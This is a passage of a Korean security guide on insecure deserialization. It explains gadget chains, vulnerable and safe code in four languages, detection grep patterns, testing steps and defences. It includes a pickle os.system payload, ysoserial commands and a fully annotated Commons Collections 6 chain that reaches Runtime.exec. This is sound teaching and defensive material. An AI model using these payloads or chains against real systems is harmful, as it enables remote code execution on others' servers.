# 안전하지 않은 역직렬화 (Insecure Deserialization)

| 레벨 | 상태 | 최종 개정 | CWE |
|---|---|---|---|
| 🔴 시니어 (1~2절은 🟡) | 🔄 개정중 | 2026-10-22 | [CWE-502](https://cwe.mitre.org/data/definitions/502.html) |

> **한눈에 보기**
> 직렬화된 바이트를 믿고 객체로 되살리면, 공격자가 "어떤 클래스의 어떤 메서드가 어떤 순서로 실행될지"를 정한다.
> 애플리케이션 코드는 한 줄도 바뀌지 않았는데 클래스패스에 이미 있는 코드 조각이 이어져 임의 명령이 실행된다.
> 막는 핵심은 하나다. **신뢰할 수 없는 바이트를 네이티브 직렬화 포맷으로 받지 말라.** 받아야 한다면 허용 목록으로 클래스를 제한하라.

## 1. 원리

직렬화(serialization)는 메모리 속 객체 그래프를 바이트로 바꾸는 것이고, 역직렬화(deserialization)는 그 반대다. 문제는 네이티브 직렬화 포맷이 **데이터만이 아니라 클래스 이름과 객체 구조까지** 담는다는 점이다. 바이트 스트림이 "나는 `java.util.HashMap`이다", "나는 `InvokerTransformer`이고 `Runtime.exec`를 호출한다"고 말하면 런타임은 그대로 그 클래스를 만든다.

```mermaid
flowchart LR
    U["🧑 공격자<br/>직렬화 바이트<br/>(클래스 이름 + 필드 값)"]
    A["웹 앱<br/>ObjectInputStream.readObject()"]
    R["런타임<br/>클래스 로드 → 필드 복원<br/>→ readObject / __wakeup / __reduce__ 실행"]
    G["가젯 체인<br/>HashMap.hashCode → TiedMapEntry<br/>→ LazyMap.get → InvokerTransformer<br/>→ Runtime.exec"]
    U -- "입력 (신뢰 안 함)" --> A
    A -- "바이트가 클래스를 고른다" --> R
    R --> G
    style A fill:#fde2e2,stroke:#b00,color:#000
    linkStyle 1 stroke:#b00,stroke-width:2px
```

<figure>
<figcaption>그림 1. 신뢰 경계는 <code>readObject()</code> 한 줄에서 무너진다. 그 뒤로는 공격자가 고른 클래스들의 메서드가 런타임에 의해 자동으로 호출된다.</figcaption>
</figure>

핵심은 세 가지다.

1. **역직렬화 중에 코드가 실행된다.** Java의 `readObject()`, PHP의 `__wakeup()`·`__destruct()`, Python의 `__reduce__()`, .NET의 `OnDeserialized` 콜백처럼, 객체를 되살리는 동안 런타임이 자동으로 호출하는 메서드("매직 메서드")가 있다.
2. **클래스 선택권이 입력에 있다.** 애플리케이션은 `User` 객체를 기대하지만, 스트림이 `HashMap`이라고 하면 `HashMap`이 만들어진다. 타입 검사는 보통 역직렬화가 끝난 **뒤**에 일어난다. 그때는 이미 늦다.
3. **가젯(gadget)은 이미 거기 있다.** 공격자는 코드를 올리지 않는다. 클래스패스에 있는 라이브러리(Commons Collections, Spring, Groovy, JDK 자체) 안에서 "역직렬화 중 호출되는 메서드 → 다른 객체의 메서드 → … → `Runtime.exec`"로 이어지는 호출 사슬을 찾는다. 이것이 **가젯 체인**(gadget chain)이다.

### 언어별 모습

| 언어 | 위험한 진입점 | 자동 실행되는 것 | 대표 가젯 소스 |
|---|---|---|---|
| Java | `ObjectInputStream.readObject()`, RMI, JMX, T3, XStream·Jackson 다형 타입 | `readObject`, `readResolve`, `hashCode`/`compareTo`(컬렉션 복원 시) | Commons Collections, Spring, Groovy, JDK (`URLDNS`) |
| PHP | `unserialize()`, `phar://` 스트림 래퍼 | `__wakeup`, `__destruct`, `__toString` | 프레임워크·라이브러리 클래스 (POP 체인) |
| Python | `pickle.loads()`, `yaml.load()`(5.4 미만. 5.1~5.3.1의 `FullLoader`도 포함. 6.0부터 `Loader` 인자 필수), `shelve`, `jsonpickle` | `__reduce__`가 돌려주는 (callable, args) | 가젯이 필요 없다. `os.system`을 직접 지정한다 |
| .NET | `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `LosFormatter`(ViewState), Json.NET `TypeNameHandling` | `OnDeserialized`, 생성자, 프로퍼티 setter | ysoserial.net 가젯 (`TypeConfuseDelegate`, `ObjectDataProvider` 등) |

Python pickle이 가장 극단적이다. `__reduce__`는 "이 객체를 되살리려면 이 함수를 이 인자로 호출하라"는 뜻이고, 함수에 `os.system`을 써도 된다. 가젯 체인을 찾을 필요조차 없다. Python 공식 문서는 pickle 모듈 첫머리에서 "신뢰할 수 없는 출처의 데이터를 언피클하지 말라"고 경고한다.

### ysoserial의 원리

[ysoserial](https://github.com/frohoff/ysoserial)은 Chris Frohoff와 Gabriel Lawrence가 2015년 AppSec California 발표 "Marshalling Pickles"와 함께 공개한 도구다. 하는 일은 단순하다. 알려진 가젯 체인마다 "명령 문자열을 받아 그 명령을 실행하도록 구성한 객체 그래프"를 만들고, 그것을 직렬화해 바이트로 내보낸다. 사용자는 `java -jar ysoserial.jar CommonsCollections6 'id'`처럼 체인 이름과 명령만 고른다. 공격자가 코드를 짜지 않아도 되게 만든 것이 2015년 이후 이 취약점이 폭발한 이유다. PHP에는 [phpggc](https://github.com/ambionics/phpggc), .NET에는 [ysoserial.net](https://github.com/pwntester/ysoserial.net)이 같은 역할을 한다.

## 2. 발생하는 코드 패턴

### Java

```java
// ❌ 취약: 요청 본문을 그대로 역직렬화
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();           // 여기서 이미 가젯 체인이 실행된다
User user = (User) obj;                  // 캐스팅은 너무 늦다
```

```java
// ✅ 안전 1: 포맷을 바꾼다. 클래스 선택권을 입력에서 빼앗는다
User user = objectMapper.readValue(request.getInputStream(), User.class);  // Jackson, 기본 타이핑 끔

// ✅ 안전 2: 불가피하게 네이티브 직렬화를 써야 하면 허용 목록 필터 (JEP 290, Java 9+ / 8u121+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
        "com.example.model.*;java.util.ArrayList;java.lang.*;!*");
ObjectInputStream ois = new ObjectInputStream(in);
ois.setObjectInputFilter(filter);
User user = (User) ois.readObject();
```

필터 문법에서 `!*`가 핵심이다. 나열하지 않은 모든 클래스를 거부한다. 차단 목록(`!org.apache.commons.collections.*`)만 쓰는 것은 다음 가젯이 나오면 끝이다.

### PHP

```php
// ❌ 취약: 쿠키를 unserialize
$data = unserialize($_COOKIE['session']);
```

```php
// ✅ 안전: JSON으로 바꾸고, 꼭 써야 하면 allowed_classes 지정
$data = json_decode($_COOKIE['session'], true);
// 또는
$data = unserialize($raw, ['allowed_classes' => false]);   // 객체를 전혀 만들지 않는다 (PHP 7.0+)
```

### Python

```python
# ❌ 취약
import pickle
obj = pickle.loads(base64.b64decode(request.cookies["state"]))

# ❌ 취약: PyYAML 5.1 미만의 yaml.load()는 임의 Python 객체를 만든다 (CVE-2017-18342).
#    5.1~5.3.1의 기본값 FullLoader도 python/object/new 생성자로 임의 객체를 만들 수 있었다
#    (CVE-2020-1747, 불완전 수정 CVE-2020-14343. 5.4에서 수정). 6.0부터는 Loader 인자가 없으면 TypeError다
cfg = yaml.load(request.data)
```

```python
# ✅ 안전
obj = json.loads(request.cookies["state"])
cfg = yaml.safe_load(request.data)
# 서명으로 무결성을 보장해도 되지만, 키가 새면 끝이므로 포맷 교체가 우선이다
```

### .NET

```csharp
// ❌ 취약: BinaryFormatter는 "안전하게 만들 수 없다"는 것이 Microsoft의 공식 입장
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(request.InputStream);
```

```csharp
// ✅ 안전: System.Text.Json (타입은 코드가 정한다)
var user = JsonSerializer.Deserialize<User>(body);
// Json.NET을 쓴다면 TypeNameHandling은 None(기본값)을 유지한다
```

Microsoft는 .NET 9에서 `BinaryFormatter` 구현을 런타임에서 제거했다. 호출하면 항상 예외가 난다. .NET Framework에는 남아 있지만 사용 중단을 권고한다.

## 3. 탐지 방법

### 3.1 코드 리뷰 / 정적 분석

**싱크를 전부 찾는다.** 역직렬화 진입점은 언어마다 이름이 정해져 있어 grep이 잘 듣는다.

```bash
# Java
grep -rnE "ObjectInputStream|readObject\(|readUnshared|XMLDecoder|XStream|enableDefaultTyping|activateDefaultTyping" --include='*.java' .
# PHP
grep -rnE "unserialize\s*\(|phar://" --include='*.php' .
# Python
grep -rnE "pickle\.loads?|cPickle|yaml\.load\(|jsonpickle|shelve|marshal\.loads" --include='*.py' .
# .NET
grep -rnE "BinaryFormatter|SoapFormatter|NetDataContractSerializer|LosFormatter|ObjectStateFormatter|TypeNameHandling" --include='*.cs' .
```

각 싱크에 대해 묻는다. **입력이 어디서 오는가?** 쿠키, 요청 본문, 메시지 큐, 캐시(Redis·Memcached), 파일 업로드, 데이터베이스 컬럼. "DB에서 온다"는 안전하지 않다. 다른 경로로 DB에 쓸 수 있으면 second-order다.

**Semgrep**: `p/java`, `p/python`, `p/php`, `p/csharp` 룰셋에 역직렬화 싱크 룰이 들어 있다. **CodeQL**: `java/unsafe-deserialization`, `py/unsafe-deserialization`.

**의존성 검사도 리뷰다.** 역직렬화 싱크가 있다면 클래스패스에 어떤 가젯 라이브러리가 있는지 본다. `mvn dependency:tree | grep -iE "commons-collections|commons-beanutils|groovy|spring-core"`. 가젯 라이브러리의 존재 자체는 취약점이 아니지만, 싱크와 결합하면 익스플로잇 가능성이 된다.

### 3.2 동적 테스트

**1단계: 직렬화 데이터 알아보기.** 쿠키, 숨은 폼 필드, 요청 본문에서 포맷의 지문을 찾는다.

| 포맷 | 지문 (raw) | Base64 시작 |
|---|---|---|
| Java | `AC ED 00 05` | `rO0AB` |
| PHP | `O:4:"User":2:{s:4:"name";...}` | `Tzo` |
| Python pickle | `\x80\x04` (프로토콜 4), `\x80\x03` | `gASV`, `gAN` |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` |
| .NET ViewState | `__VIEWSTATE` 필드 | `/wE` |

**2단계: 구조 바꾸기.** PHP처럼 사람이 읽을 수 있는 포맷이면 필드 값을 바꿔 본다. `s:5:"admin";b:0` → `b:1`. 가젯 없이도 권한 상승이 되는 경우가 많다.

**3단계: 영향 없는 가젯으로 "역직렬화가 일어나는가" 확인.** ysoserial의 `URLDNS` 체인은 JDK 클래스만 쓰고, DNS 조회 하나만 일으킨다. Burp Collaborator나 자체 DNS 로그에 조회가 찍히면 역직렬화가 확인된 것이다.

```bash
java -jar ysoserial.jar URLDNS "http://<your-collaborator-id>.oastify.com" | base64 -w0
```

**4단계: 가젯 라이브러리 추정.** 에러 메시지의 스택 트레이스, `ClassNotFoundException`에 찍힌 클래스 이름, 응답 헤더의 프레임워크 버전으로 클래스패스를 추정한 뒤 체인을 고른다. 시간 지연 가젯(`sleep`)으로 실행 여부를 확인하고 멈춘다.

자동화: Burp 확장 [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)가 1~4단계를 돕는다. 하지만 어떤 체인이 통하는지 판단하는 것은 사람의 일이다.

## 4. 실습 🧪

### 4.1 로컬 최소 재현 (Python, 5분)

가젯 체인 없이 원리만 본다. `__reduce__`가 "되살릴 때 이 함수를 호출하라"는 뜻임을 눈으로 확인한다.

```python
# demo.py  (실습용. 명령은 무해한 echo로 고정한다)
import pickle, os

class Evil:
    def __reduce__(self):
        return (os.system, ("echo pickle-executed-this",))

payload = pickle.dumps(Evil())
print(payload[:20])            # b'\x80\x04\x95...' 지문 확인 (Python 3.14부터는 기본 프로토콜 5 → \x80\x05)
pickle.loads(payload)          # ← 이 줄에서 echo가 실행된다. 객체는 만들어지지도 않는다
```

`pickle.loads`의 반환값은 `os.system`의 반환값(0)이다. `Evil` 인스턴스는 생기지 않는다. 역직렬화가 "객체 복원"이 아니라 "명령 실행"이 될 수 있음을 이 세 줄이 보여 준다. 그다음 `json.loads`로 바꿔 같은 입력이 예외로 끝나는지 확인한다(bytes 입력은 `UnicodeDecodeError`, 문자열 입력은 `JSONDecodeError`).

### 4.2 공개 실습 환경

[PortSwigger Web Security Academy: Insecure deserialization](https://portswigger.net/web-security/deserialization)의 랩을 순서대로 푼다.

| 순서 | 랩 | 익히는 것 |
|---|---|---|
| 1 | Modifying serialized objects | PHP 직렬화 구조 읽고 필드 바꾸기 (3.2절 2단계) |
| 2 | Modifying serialized data types | 타입 저글링과 결합 |
| 3 | Using application functionality to exploit insecure deserialization | `__destruct`가 파일을 지우는 경우 |
| 4 | Arbitrary object injection in PHP | 소스 코드에서 매직 메서드 찾기 |
| 5 | Exploiting Java deserialization with Apache Commons | ysoserial + Commons Collections |
| 6 | Exploiting PHP deserialization with a pre-built gadget chain | phpggc + 서명 쿠키 |
| 7 | Developing a custom gadget chain for Java deserialization | 가젯 체인을 직접 잇기 🔴 |
| 8 | Using PHAR deserialization to deploy a custom gadget chain | `phar://` 경로 🔴 |

## 5. 익스플로잇 검증

| 단계 | 확인 | 심각도에 미치는 영향 |
|---|---|---|
| 1 | 직렬화 포맷이 식별되고, 값을 바꾸면 애플리케이션 동작이 바뀐다 | 역직렬화 존재. 값 변조만으로 권한 상승이면 High |
| 2 | `URLDNS` 같은 무해 가젯으로 외부 조회가 발생한다 | 임의 클래스 역직렬화 확인 |
| 3 | 시간 지연 가젯으로 코드 실행이 확인된다 | RCE 확인. Critical |
| 4 | 실행 컨텍스트(사용자, 네트워크 위치) 확인 | 피해 범위 산정 |

3단계에서 멈춘다. `id`나 `whoami` 출력이 필요하면 허가 범위를 다시 확인하고 OOB 채널로 결과만 받는다. 역직렬화 RCE는 거의 항상 Critical이며, 인증 전 진입점이면 더 그렇다. CVSS보다 "어디서 들어오는 바이트인가"가 심각도를 결정한다. [보고 2장](../part8-reporting/02-severity.md).

## 6. 방어

| 계층 | 조치 | 효과 |
|---|---|---|
| 코드 | **포맷 교체**: JSON·Protobuf처럼 클래스 정보를 담지 않는 포맷. 타입은 코드가 정한다 | 근본 제거 |
| 코드 | 네이티브 직렬화가 불가피하면 **허용 목록** 필터 (`ObjectInputFilter` + `!*`, `allowed_classes`, `RestrictedUnpickler.find_class`) | 가젯 클래스 로드 차단 |
| 코드 | 직렬화 데이터에 HMAC 서명, 검증 **후** 역직렬화 | 변조 차단. 키 유출·고정 키(CVE-2020-0688)에는 무력 |
| 프레임워크 | Jackson `enableDefaultTyping`·Json.NET `TypeNameHandling` 끔, XStream 허용 목록, PyYAML `safe_load` | 다형 타입 역직렬화 차단 |
| 프레임워크 | JVM 전역 필터 `-Djdk.serialFilter=...`, Commons Collections 3.2.2+ / 4.1+ | 애플리케이션 코드를 못 고칠 때의 안전망 |
| 인프라 | RMI·JMX·T3 포트 외부 노출 차단, 역직렬화 서비스 격리·최소 권한 | 인증 전 진입점 제거, 피해 축소 |
| 인프라 | 가젯 라이브러리 버전 관리 (SCA) | 알려진 체인 제거. 새 체인에는 무력 |
| 탐지 | 요청에 `rO0AB`, `AAEAAAD`, `O:` 패턴 알림. 웹 프로세스의 자식 프로세스 생성 감시 | 사후 대응 |

**하지 말아야 할 것**

- 차단 목록. WebLogic은 CVE-2015-4852 이후 차단 목록으로 대응했고, 같은 T3 경로에서 [CVE-2017-3248](https://nvd.nist.gov/vuln/detail/CVE-2017-3248), [CVE-2018-2628](https://nvd.nist.gov/vuln/detail/CVE-2018-2628) 등 우회가 수년간 이어졌다.
- "가젯 라이브러리만 빼면 된다"는 생각. Apache도 Commons Collections 3.2.2를 내며 "이것이 유일한 가젯이 아니다"라고 명시했다. JDK 자체에도 가젯이 있다.
- "역직렬화 뒤에 `instanceof`로 검사한다". 코드 실행은 역직렬화 **중**에 끝난다.

## 7. 우회 기법 🔴

| 방어 | 우회 |
|---|---|
| 클래스 차단 목록 | 목록에 없는 새 가젯 체인. 차단된 클래스를 다른 직렬화 메커니즘(RMI 원격 객체, JRMP)으로 감싸 필터를 건너뛰는 변형 |
| JEP 290 필터의 깊이·크기 제한 | 제한 안에 들어오는 짧은 체인 선택 |
| "Java 직렬화 안 씀, JSON 씀" | Jackson `enableDefaultTyping` ([CVE-2017-7525](https://nvd.nist.gov/vuln/detail/CVE-2017-7525)), Json.NET `TypeNameHandling.All`, XStream, fastjson `autoType`. JSON·XML 안에 클래스 이름을 쓰게 하는 설정이 있으면 같은 문제다 |
| PHP `unserialize` 입력 없음 | `phar://` 래퍼. **PHP 8.0 미만**에서는 `file_exists()`, `is_file()`, `getimagesize()` 같은 파일 함수에 `phar://업로드파일`을 넘기면 phar 메타데이터가 자동으로 역직렬화된다. 8.0부터 파일 함수는 메타데이터를 건드리지 않고 `Phar::getMetadata()`를 직접 불러야만 역직렬화된다(PHP 8.3에서 실행해 확인). Sam Thomas, Black Hat USA 2018 |
| PHP 7.4+ `__unserialize` | 구 `__wakeup` 대신 새 메서드를 쓰는 클래스에서 다시 체인을 찾는다 |
| Python `RestrictedUnpickler` | `find_class`에서 허용한 모듈 안의 위험한 속성(예: `builtins.getattr`)을 디딤돌로 사용 |
| .NET ViewState MAC | 머신 키가 고정·유출된 경우 서명을 직접 만든다 (CVE-2020-0688). `ysoserial.net -p ViewState` |
| 서명 검증 | 키가 소스 코드·설정 파일에 있고 다른 취약점(경로 조작, SSRF)으로 읽힌다 |

**Log4Shell과의 관계**: [CVE-2021-44228](../part7-walkthroughs/01-cve-2021-44228-log4shell.md)은 JNDI 조회를 통해 원격 클래스를 로드하거나, 그것이 막힌 JDK에서는 **LDAP 응답 안의 직렬화 객체를 역직렬화**하는 경로로 RCE에 도달했다. 역직렬화 가젯이 다른 취약점의 2차 단계로 쓰이는 대표 사례다.

### 7.1 가젯 체인 해부: Commons Collections 3.1

우회를 이해하려면 체인 하나를 끝까지 읽어야 한다. "차단 목록이 왜 안 되는가"는 체인의 각 고리가 **얼마나 평범한 코드**인지 보면 저절로 답이 나온다. 여기서는 ysoserial의 `CommonsCollections6`(Matthias Kaiser)을 따라간다. JDK 버전을 타지 않는 가장 단순한 형태다. 소스 주석의 호출 순서를 변환기 단위로 풀어 쓰면 다음과 같다.

```
ObjectInputStream.readObject()
  java.util.HashSet.readObject()
    java.util.HashMap.put() → HashMap.hash()
      TiedMapEntry.hashCode() → TiedMapEntry.getValue()
        LazyMap.get()
          ChainedTransformer.transform()
            ConstantTransformer.transform()   → Runtime.class
            InvokerTransformer.transform()    → Class.getMethod("getRuntime")
            InvokerTransformer.transform()    → Method.invoke(null)  = Runtime 인스턴스
            InvokerTransformer.transform()    → Runtime.exec(cmd)
```

고리마다 "어떤 메서드가, 어떤 조건에서, 무엇을 부르는가"를 적는다. 인용한 코드는 Commons Collections 3.1 소스 그대로다.

**1. 진입점: `HashMap.readObject()`가 `hashCode()`를 부른다.** JDK의 `HashMap`은 역직렬화할 때 키·값 쌍을 하나씩 읽어 `putVal(hash(key), key, value, …)`로 다시 넣는다. `hash()`는 `key.hashCode()`를 호출한다. 즉 **`HashMap`의 키로 들어 있는 객체는 역직렬화 중에 반드시 `hashCode()`가 실행된다.** `HashSet.readObject()`도 내부 `HashMap`에 `map.put(e, PRESENT)`를 하므로 같다. 애플리케이션 코드가 `readObject()`의 반환값을 보기 전에 일어나는 일이다. 체인의 첫 고리는 JDK 자체이고, 어떤 필터도 `java.util.HashMap`을 막을 수는 없다.

**2. `TiedMapEntry.hashCode()`가 `Map.get()`을 부른다.** `Map.Entry`의 규약은 "키의 해시 XOR 값의 해시"다. `TiedMapEntry`는 값을 자기 안에 두지 않고 **묶인(tied) 맵에서 그때그때 꺼내는** 엔트리다. 그래서 해시를 계산하려면 맵에 물어봐야 한다.

```java
// org.apache.commons.collections.keyvalue.TiedMapEntry (3.1)
public Object getValue() {
    return map.get(key);
}
public int hashCode() {
    Object value = getValue();
    return (getKey() == null ? 0 : getKey().hashCode()) ^
           (value == null ? 0 : value.hashCode());
}
```

`hashCode()`라는 "순수해 보이는" 메서드가 다른 객체의 `get()`으로 넘어가는 다리다. `map` 필드는 `Map` 인터페이스 타입이므로 공격자가 어떤 구현체든 넣을 수 있다. 같은 클래스의 `toString()`도 `getValue()`를 부르며, 그쪽은 `CommonsCollections5`의 다리가 된다.

**3. `LazyMap.get()`이 없는 키를 만나면 `factory.transform(key)`를 부른다.** `LazyMap`은 "값이 없으면 팩토리로 만들어 넣는" 데코레이터다. 팩토리는 `Transformer` 인터페이스 타입이고 `Serializable`이다.

```java
// org.apache.commons.collections.map.LazyMap (3.1)
public Object get(Object key) {
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

조건은 하나, "키가 아직 없을 것". 공격자가 내부 맵을 빈 `HashMap`으로 두면 항상 만족한다. 이 지점부터 호출의 주체가 **데이터 구조에서 함수 객체로** 바뀐다.

**4. `ChainedTransformer.transform()`은 변환기 배열을 순서대로 돌린다.** 앞 변환기의 출력이 뒤 변환기의 입력이 된다. 한 번의 `transform(key)` 호출이 여러 단계의 호출로 펼쳐지는 이유다.

```java
// org.apache.commons.collections.functors.ChainedTransformer (3.1)
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

**5. `ConstantTransformer`는 입력을 버리고 상수를 돌려준다.** 체인의 첫 입력은 `LazyMap`의 키(ysoserial에서는 문자열 `"foo"`)인데 쓸모가 없다. `ConstantTransformer(Runtime.class)`가 그 자리를 `Runtime.class`로 바꿔 놓는다. 이것이 리플렉션의 출발점이다.

**6. `InvokerTransformer`는 입력 객체의 메서드를 리플렉션으로 호출한다.** 이 클래스가 체인의 **싱크**다.

```java
// org.apache.commons.collections.functors.InvokerTransformer (3.1)
public Object transform(Object input) {
    if (input == null) { return null; }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
    } catch (NoSuchMethodException ex) { /* FunctorException */ }
    …
}
```

메서드 이름(`iMethodName`), 파라미터 타입, 인자(`iArgs`)가 모두 **직렬화되는 필드**다. 즉 "어떤 객체에 어떤 메서드를 어떤 인자로 부를지"를 바이트 스트림이 정한다. 그런데 `Runtime.getRuntime()`은 정적 메서드이고 `InvokerTransformer`는 항상 **입력 객체에 대해** 메서드를 호출하므로 한 번에 못 부른다. 그래서 세 개를 잇는다.

| 순서 | 입력 | `input.getClass()` | 호출 | 출력 |
|---|---|---|---|---|
| ① | `Runtime.class` | `Class` | `Class.getMethod("getRuntime", [])` | `Method` 객체 |
| ② | `Method` 객체 | `Method` | `Method.invoke(null, [])` | `Runtime` 인스턴스 |
| ③ | `Runtime` 인스턴스 | `Runtime` | `Runtime.exec(cmd)` | `Process` |

①에서 `Class` 클래스의 `getMethod`를, ②에서 `Method` 클래스의 `invoke`를 호출한다. **리플렉션으로 리플렉션을 부르는** 구조이고, 그래서 `Runtime` 자체는 `Serializable`이 아니어도 된다. 마지막에 `ConstantTransformer(1)`을 하나 더 붙여 `Process` 대신 정수 `1`이 `LazyMap`에 저장되게 한다. 반환값의 타입 때문에 체인이 중간에 예외로 끝나는 것을 막는 정리 단계다.

**ysoserial은 이 객체 그래프를 어떻게 조립하는가.** `CommonsCollections6.getObject()`의 핵심은 다음과 같다(주석은 옮긴이).

```java
final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] { String.class }, execArgs),
        new ConstantTransformer(1) };
Transformer transformerChain = new ChainedTransformer(transformers);
final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);   // 3단계
TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");                  // 2단계
HashSet map = new HashSet(1);                                            // 1단계
map.add("foo");
// … 리플렉션으로 HashSet 내부 HashMap의 첫 노드를 찾아
keyField.set(node, entry);   // 키 "foo"를 TiedMapEntry로 바꿔치기
return map;
```

`map.add(entry)`로 직접 넣지 않고 `"foo"`를 넣은 뒤 리플렉션으로 바꿔치기하는 이유가 중요하다. `add()`는 `hashCode()`를 부르므로 **페이로드를 만드는 쪽에서 체인이 실행**돼 버린다. 체인은 생성 시점이 아니라 피해자의 `readObject()` 시점에만 돌아야 한다. `CommonsCollections1`이 `ChainedTransformer`를 먼저 무해한 배열로 만들고 나중에 `iTransformers` 필드를 리플렉션으로 교체하는 것("arm")도 같은 이유다.

**체인을 손으로 밟아 보기.** 직렬화 없이, 각 고리를 자바 코드로 직접 호출하면 위 설명이 그대로 재현된다. 실습 환경에서 Commons Collections 3.1 jar를 클래스패스에 두고 실행한다. 명령은 자기 디렉터리에 표식 파일을 만드는 `touch`로 고정한다.

```java
// ChainSteps.java  (실습용. 직렬화 바이트를 만들거나 보내지 않는다)
Object o = new ConstantTransformer(Runtime.class).transform("무시되는 입력");   // → class java.lang.Runtime
o = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}).transform(o);               // → Method getRuntime
o = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}).transform(o);                       // → java.lang.Runtime@…
Transformer[] ts = { /* 위 세 개 + */ new InvokerTransformer("exec",
        new Class[]{String.class}, new Object[]{"touch /tmp/lab/marker"}), new ConstantTransformer(1) };
Transformer chain = new ChainedTransformer(ts);
Map lazy = LazyMap.decorate(new HashMap(), chain);
lazy.get("foo");                                           // 5단계: 여기서 touch 실행
// LazyMap은 한 번 만든 값을 안쪽 HashMap에 넣어 두므로 같은 맵에 "foo"를 다시 물으면
// 팩토리(체인)가 돌지 않는다. 단계마다 새 LazyMap을 만들어야 체인이 다시 실행된다
Map lazy2 = LazyMap.decorate(new HashMap(), chain);
new TiedMapEntry(lazy2, "foo").hashCode();                 // 6단계: hashCode 하나로 같은 결과
Map lazy3 = LazyMap.decorate(new HashMap(), chain);
new HashMap().put(new TiedMapEntry(lazy3, "foo"), 1);      // 7단계: readObject가 밟는 putVal 경로
```

`javac -cp commons-collections-3.1.jar ChainSteps.java && java -cp commons-collections-3.1.jar:. ChainSteps`로 돌리면 5·6·7단계마다 표식 파일이 생긴다. 7단계가 곧 `HashMap.readObject()`의 동작이다. 역직렬화 취약점은 "이상한 바이트"가 아니라 **`put` 한 번**으로 환원된다.

### 7.2 가젯 체인을 직접 찾는 법

알려진 체인이 막혔을 때 공격자가 하는 일이고, 분석가가 "이 클래스패스에 아직 체인이 남아 있는가"를 판단할 때 하는 일이다. 세 가지를 찾아 잇는다.

**진입점(소스)**: 역직렬화 중 JVM이 자동으로 부르는 메서드.

| 자동 호출 | 어디서 | ysoserial 예 |
|---|---|---|
| `readObject` / `readResolve` / `readExternal` | 그 메서드를 가진 모든 `Serializable` 클래스 | 거의 모든 체인의 첫 고리 |
| `hashCode()` / `equals()` | `HashMap`·`HashSet`·`Hashtable`의 키 복원 | CC6 (`TiedMapEntry`), CC7 (`Hashtable`), `URLDNS` |
| `compareTo()` / `Comparator.compare()` | `PriorityQueue`·`TreeMap`의 힙·트리 재구성 | CC2·CC4 (`TransformingComparator`, collections4) |
| `toString()` | `BadAttributeValueExpException.readObject` | CC5 (`TiedMapEntry.toString`) |
| `Map.entrySet()` 등 인터페이스 호출 | 동적 프록시의 `InvocationHandler.invoke` | CC1·CC3 (`AnnotationInvocationHandler`) |

**싱크**: 임의 코드로 이어지는 마지막 호출. 리플렉션(`Method.invoke`, 위의 `InvokerTransformer`), 바이트코드 로딩(`TemplatesImpl.newTransformer()`가 필드 안의 클래스 바이트를 `defineClass`로 올린다. CC2·CC3·CC4가 쓴다), JNDI 조회(`JdbcRowSetImpl` 류), 스크립트 엔진, `ProcessBuilder`.

**연결 고리**: "인터페이스 타입 필드를 갖고, 그 필드의 메서드를 부르는 `Serializable` 클래스". `TiedMapEntry.map`, `LazyMap.factory`, `ChainedTransformer.iTransformers`가 전부 이 모양이다. 공격자는 필드에 어떤 구현체든 넣을 수 있으므로, 인터페이스 호출 하나가 곧 "다음 고리를 고를 자유"다. 2018년 Black Hat에서 공개된 [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)(Ian Haken)는 바이트코드에서 이 세 가지를 자동으로 잇고, CodeQL로도 같은 질의를 쓸 수 있다. 수동으로는 클래스패스의 jar를 디컴파일해 `implements Serializable`과 `Transformer`·`Comparator`·`Map` 타입 필드를 grep하는 것부터 시작한다.

**라이브러리 버전별 차이**: 같은 이름의 체인이 버전에 따라 되고 안 된다. ysoserial 소스의 `@Dependencies`와 `JavaVersion` 클래스가 그 조건을 코드로 적어 두었다.

| 조건 | 영향 |
|---|---|
| Commons Collections 3.1~3.2.1 | CC1·CC3·CC5·CC6·CC7 전부 가능 |
| Commons Collections 3.2.2 (2015-11) | `InvokerTransformer` 등 함수자의 역직렬화를 기본 차단. `org.apache.commons.collections.enableUnsafeSerialization=true`가 아니면 모든 CC 체인이 그 고리에서 끊긴다 |
| collections4 4.0 | 패키지가 `org.apache.commons.collections4`로 바뀌어 3.x용 체인은 클래스를 못 찾는다. 대신 4.0에서 `TransformingComparator`가 `Serializable`이 되어 CC2·CC4(`PriorityQueue` 진입점)가 생겼다. 4.1에서 3.2.2와 같은 차단이 들어갔다 |
| JDK 8u71 이하 | CC1·CC3의 진입점 `AnnotationInvocationHandler.readObject`가 프록시 맵의 `entrySet()`을 호출한다. 8u72부터 구현이 바뀌어 이 진입점이 사라졌다(`JavaVersion.isAnnInvHUniversalMethodImpl`: `update <= 71`) |
| JDK 버전 무관 | CC6·CC7은 `HashMap`·`Hashtable`의 `hashCode` 호출만 쓰므로 JDK를 타지 않는다. 분석가가 "JDK가 최신이니 괜찮다"고 쓰면 틀리는 이유다 |

### 7.3 JEP 290 필터는 체인을 어디서 끊는가

